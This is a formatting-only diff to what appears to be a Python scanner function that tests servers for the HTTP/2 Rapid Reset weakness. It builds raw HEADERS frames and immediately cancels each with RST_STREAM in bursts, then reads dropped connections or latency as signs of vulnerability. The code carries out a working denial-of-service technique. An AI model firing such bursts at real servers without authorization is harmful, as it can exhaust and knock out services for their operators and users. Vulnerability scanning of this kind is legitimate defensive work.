@@ -24,7 +24,9 @@ FRAME_RST_STREAM = 0x03
 FLAG_END_HEADERS = 0x04
 
 
-def build_frame(length: int, ftype: int, flags: int, stream_id: int, payload: bytes = b"") -> bytes:
+def build_frame(
+    length: int, ftype: int, flags: int, stream_id: int, payload: bytes = b""
+) -> bytes:
     """Builds an HTTP/2 frame."""
     header = struct.pack(">I", (length << 8) | ftype)[1:]  # 24-bit length + 8-bit type
     header += struct.pack(">B", flags)
@@ -77,11 +79,21 @@ def check_rapid_reset(target: str, ip: str, port: int) -> tuple[bool, str]:
         payload = bytearray()
         for _ in range(burst_size):
             # Open Stream
-            payload.extend(build_frame(len(dummy_hpack), FRAME_HEADERS, FLAG_END_HEADERS, stream_id, dummy_hpack))
+            payload.extend(
+                build_frame(
+                    len(dummy_hpack),
+                    FRAME_HEADERS,
+                    FLAG_END_HEADERS,
+                    stream_id,
+                    dummy_hpack,
+                )
+            )
             # Immediately Reset Stream
             # Error code 8 = CANCEL
             rst_payload = struct.pack(">I", 8)
-            payload.extend(build_frame(4, FRAME_RST_STREAM, 0x00, stream_id, rst_payload))
+            payload.extend(
+                build_frame(4, FRAME_RST_STREAM, 0x00, stream_id, rst_payload)
+            )
 
             stream_id += 2  # Client stream IDs must be odd
 
@@ -102,16 +114,25 @@ def check_rapid_reset(target: str, ip: str, port: int) -> tuple[bool, str]:
         elapsed = time.time() - start_time
 
         if not resp:
-            return True, "Connection dropped abruptly after Rapid Reset burst. Server is likely vulnerable."
+            return (
+                True,
+                "Connection dropped abruptly after Rapid Reset burst. Server is likely vulnerable.",
+            )
 
         if elapsed > 3.0:  # High latency indicates resource exhaustion
-            return True, f"Server exhibited severe latency ({elapsed:.2f}s) recovering from Rapid Reset burst."
+            return (
+                True,
+                f"Server exhibited severe latency ({elapsed:.2f}s) recovering from Rapid Reset burst.",
+            )
 
         return False, ""
 
     except (TimeoutError, ConnectionResetError, BrokenPipeError):
         # If it crashes or resets during the burst, it's vulnerable.
-        return True, "Connection reset or timed out during the attack burst, indicating resource exhaustion."
+        return (
+            True,
+            "Connection reset or timed out during the attack burst, indicating resource exhaustion.",
+        )
     except Exception as e:
         logger.debug(f"Rapid Reset check failed on {target}: {e}")
         return False, ""
